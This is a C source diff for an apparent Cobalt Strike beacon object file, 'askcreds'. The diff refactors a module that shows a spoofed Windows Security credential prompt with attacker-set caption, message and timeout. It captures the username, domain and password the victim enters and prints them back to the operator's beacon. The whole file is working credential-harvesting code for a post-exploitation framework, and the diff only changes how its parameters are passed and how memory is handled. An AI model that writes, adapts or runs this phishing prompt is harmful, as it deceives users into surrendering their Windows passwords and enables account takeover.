@@ -1,4 +1,4 @@
-#define SECURITY_WIN32 
+#define SECURITY_WIN32
 
 #include <windows.h>
 #include <wincred.h>
@@ -7,43 +7,38 @@
 #include "askcreds.h"
 #include "../_include/beacon.h"
 
-
-#define TIMEOUT 60
 #define MAX_NAME 8192
-#define REASON L"Restore Network Connection"
-#define MESSAGE L"Please verify your Windows user credentials to proceed."
 
+typedef struct _THREAD_PARAMS {
+	LPWSTR lpwReason;
+	LPWSTR lpwMessage;
+} THREAD_PARAMS, *PTHREAD_PARAMS;
 
 BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
 	PCHAR pWindowTitle = NULL;
 	LPWSTR pExeName = NULL;
 	DWORD dwProcId = 0; 
 
-	if (!hWnd) {
+	if (!hWnd)
 		return TRUE;
-	}
 
-	if (!USER32$IsWindowVisible(hWnd)) {
+	if (!USER32$IsWindowVisible(hWnd))
 		return TRUE;
-	}
 
 #if defined(WOW64)
 	LONG_PTR lStyle = USER32$GetWindowLongA(hWnd, GWL_STYLE);
 #else
 	LONG_PTR lStyle = USER32$GetWindowLongPtrA(hWnd, GWL_STYLE);
 #endif
-	if (!USER32$GetWindowThreadProcessId(hWnd, &dwProcId)){
+	if (!USER32$GetWindowThreadProcessId(hWnd, &dwProcId))
 		return TRUE;
-	}
 
 	pWindowTitle = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_NAME);
-	if (pWindowTitle == NULL) {
+	if (pWindowTitle == NULL)
 		goto CleanUp;
-	}
 
-	if (!USER32$SendMessageA(hWnd, WM_GETTEXT, MAX_NAME, (LPARAM)pWindowTitle)) {
+	if (!USER32$SendMessageA(hWnd, WM_GETTEXT, MAX_NAME, (LPARAM)pWindowTitle))
 		goto CleanUp;
-	}
 
 	if (MSVCRT$_stricmp(pWindowTitle, "Windows Security") == 0) {
 		USER32$PostMessageA(hWnd, WM_CLOSE, 0, 0);
@@ -69,36 +64,33 @@ BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {
 			}
 		}
 
-		if (hProcess != NULL){
+		if (hProcess)
 			KERNEL32$CloseHandle(hProcess);
-		}
 	}
 
 CleanUp:
 
-	if (pWindowTitle != NULL) {
+	if (pWindowTitle)
 		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pWindowTitle);
-	}
 
-	if (pExeName != NULL) {
+	if (pExeName)
 		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pExeName);
-	}
 
 	return TRUE;
 }
 
-DWORD WINAPI AskCreds(_In_ LPCWSTR lpwReason) {
+DWORD WINAPI AskCreds(_In_ PTHREAD_PARAMS params) {
 	DWORD dwRet = 0;
 	HWND hWnd;
 	CREDUI_INFOW credUiInfo;
-	credUiInfo.pszCaptionText = lpwReason;
-	credUiInfo.pszMessageText = (LPCWSTR)MESSAGE;
+	credUiInfo.pszCaptionText = params->lpwReason;
+	credUiInfo.pszMessageText = (LPCWSTR) params->lpwMessage;
 	credUiInfo.cbSize = sizeof(credUiInfo);
 	credUiInfo.hbmBanner = NULL;
 	credUiInfo.hwndParent = NULL;
 
 	DWORD authPackage = 0;
-	WCHAR szUsername[MAXLEN];
+	LPWSTR szUsername = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 514);
 	LPWSTR lpwPasswd = L"";
 	LPVOID inCredBuffer = NULL;
 	LPVOID outCredBuffer = NULL;
@@ -106,7 +98,7 @@ DWORD WINAPI AskCreds(_In_ LPCWSTR lpwReason) {
 	ULONG outCredSize = 0;
 	BOOL bSave = FALSE;
 
-	ULONG nSize = sizeof(szUsername) / sizeof(WCHAR);
+	ULONG nSize = 257;
 	if (SECUR32$GetUserNameExW(NameSamCompatible, szUsername, &nSize)) {
 		if (!CREDUI$CredPackAuthenticationBufferW(CRED_PACK_GENERIC_CREDENTIALS, (LPWSTR)szUsername, lpwPasswd, 0, &inCredSize) && KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
 			inCredBuffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, inCredSize);
@@ -119,6 +111,7 @@ DWORD WINAPI AskCreds(_In_ LPCWSTR lpwReason) {
 			}
 		}
 	}
+	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, szUsername);
 
 	hWnd = USER32$GetForegroundWindow();
 	if (hWnd != NULL) {
@@ -126,92 +119,83 @@ DWORD WINAPI AskCreds(_In_ LPCWSTR lpwReason) {
 	}
 
 	dwRet = CREDUI$CredUIPromptForWindowsCredentialsW(
-		&credUiInfo, 0, 
-		&authPackage, 
-		inCredBuffer, 
-		inCredSize, 
-		&outCredBuffer, 
-		&outCredSize, 
-		&bSave, 
+		&credUiInfo, 0,
+		&authPackage,
+		inCredBuffer,
+		inCredSize,
+		&outCredBuffer,
+		&outCredSize,
+		&bSave,
 		CREDUIWIN_GENERIC | CREDUIWIN_CHECKBOX
 		);
-	
-	if (dwRet == ERROR_SUCCESS) { 
-		WCHAR szUsername[MAXLEN + 1];
-		WCHAR szPasswd[MAXLEN + 1];
-		WCHAR szDomain[MAXLEN + 1];
-		DWORD maxLenName = MAXLEN + 1;
-		DWORD maxLenPassword = MAXLEN + 1;
-		DWORD maxLenDomain = MAXLEN + 1;
+
+	if (dwRet == ERROR_SUCCESS) {
+		LPWSTR szUsername = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 514);
+		LPWSTR szPasswd = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 514);
+		LPWSTR szDomain = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 514);
+		DWORD maxLenName = 514;
+		DWORD maxLenPassword = 514;
+		DWORD maxLenDomain = 514;
 
 		if (CREDUI$CredUnPackAuthenticationBufferW(0, outCredBuffer, outCredSize, szUsername, &maxLenName, szDomain, &maxLenDomain, szPasswd, &maxLenPassword)) {
 			if (MSVCRT$_wcsicmp(szDomain, L"") == 0) {
-				BeaconPrintf(CALLBACK_OUTPUT, 
+				BeaconPrintf(CALLBACK_OUTPUT,
 					"[+] Username: %ls\n"
 					"[+] Password: %ls\n", szUsername, szPasswd);
 
 			}
 			else {
-				BeaconPrintf(CALLBACK_OUTPUT, 
+				BeaconPrintf(CALLBACK_OUTPUT,
 					"[+] Username: %ls\n"
 					"[+] Domainname: %ls\n"
 					"[+] Password: %ls\n", szUsername, szDomain, szPasswd);
 			}
 		}
-
-		MSVCRT$memset(szUsername, 0, sizeof(szUsername));
-		MSVCRT$memset(szPasswd, 0, sizeof(szPasswd));
-		MSVCRT$memset(szDomain, 0, sizeof(szDomain));
+		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, szUsername);
+		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, szPasswd);
+		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, szDomain);
 	}
 	else if (dwRet == ERROR_CANCELLED) {
-		BeaconPrintf(CALLBACK_ERROR, "The operation was canceled by the user, try again ;)\n");
+		BeaconPrintf(CALLBACK_ERROR, "The operation was canceled by the user\n");
 	}
 	else {
 		BeaconPrintf(CALLBACK_ERROR, "CredUIPromptForWindowsCredentialsW failed, error: %d\n", dwRet);
 	}
 
-	if (inCredBuffer != NULL) {
+	if (inCredBuffer)
 		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, inCredBuffer);
-	}
 
 	return dwRet;
 }
 
-
 VOID go(IN PCHAR Args, IN ULONG Length) {
-	HANDLE hThread = NULL;
-	DWORD ThreadId = 0;
-	DWORD dwTimeOut = TIMEOUT * 1000;
-	DWORD dwResult = 0;
-	LPWSTR lpwReason = NULL;
+	THREAD_PARAMS params;
 
-	// Parse Arguments
 	datap parser;
 	BeaconDataParse(&parser, Args, Length);	
-	lpwReason = (WCHAR*)BeaconDataExtract(&parser, NULL);
-	if (lpwReason == NULL) {
-		lpwReason = REASON;
-	}
+	params.lpwReason  = (WCHAR*)BeaconDataExtract(&parser, NULL);
+	params.lpwMessage = (WCHAR*)BeaconDataExtract(&parser, NULL);
+    DWORD dwTimeOut = BeaconDataInt(&parser) * 1000;
 
-	hThread =  KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AskCreds, (LPVOID)lpwReason, 0, &ThreadId);
+	DWORD ThreadId = 0;
+	HANDLE hThread = KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AskCreds, (LPVOID)&params, 0, &ThreadId);
 	if (hThread == NULL) {
-		BeaconPrintf(CALLBACK_ERROR, "Failed to create AskCreds thread.\n");
+		BeaconPrintf(CALLBACK_ERROR, "Failed to create thread.\n");
 		return;
 	}
 
-	dwResult = KERNEL32$WaitForSingleObject(hThread, dwTimeOut);
+	DWORD dwResult = KERNEL32$WaitForSingleObject(hThread, dwTimeOut);
 	if (dwResult == WAIT_TIMEOUT) {  
 		BeaconPrintf(CALLBACK_ERROR, "ThreadId: %d timed out, closing Window.\n", ThreadId);
 		if (!USER32$EnumWindows(EnumWindowsProc, (LPARAM)NULL)) { // Cancel operation by closing Window.
 			KERNEL32$TerminateThread(hThread, 0); // Only if WM_CLOSE failed, very dirty..
 			return;
 		}
-		KERNEL32$WaitForSingleObject(hThread, 2000); // Wait a sec for thread to cleanup...
+		KERNEL32$WaitForSingleObject(hThread, 2000);
 	}
 
-	if (hThread != NULL) {
+	if (hThread)
 		KERNEL32$CloseHandle(hThread);
-	}
 
 	return;
 }
